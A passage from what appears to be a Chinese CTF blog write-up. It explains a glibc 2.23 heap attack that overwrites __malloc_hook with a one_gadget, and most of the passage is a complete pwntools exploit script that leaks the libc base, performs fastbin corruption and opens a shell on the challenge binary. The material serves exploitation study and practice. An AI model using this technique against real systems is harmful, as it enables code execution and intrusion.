所指向的内存地址也就是 0x00007f1d82b46afd 所指向的</p>\n<p>这里因为中断了一下 所以内存地址变了  但还是上面那个 这个是修改前的</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220229133.png\" alt=\"image-20230416220229133\"></p>\n<p>这是修改后的</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416221513786.png\" alt=\"image-20230416221513786\"></p>\n<p>因为是倒序的所以 0d 对应 3 个 00 而 0e 对应两个 00 所以要 p8 (0)*3</p>\n<p>执行代码后，即可修改 **__malloc_hook** 的值，可以看到已经将__malloc_hook 修改为 one_gadget 了。下次调用 malloc 或者 calloc 的时候就可以获得 shell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r=remote(\"node4.buuoj.cn\",28959)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>r<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc-2.23.so\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">allocate</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fill</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>malloc_hook<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">88</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>libc_base<span class=\"token operator\">=</span>malloc_hook<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x3c4aed</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>payload<span class=\"token operator\">=</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x4526a</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        }
    ]
}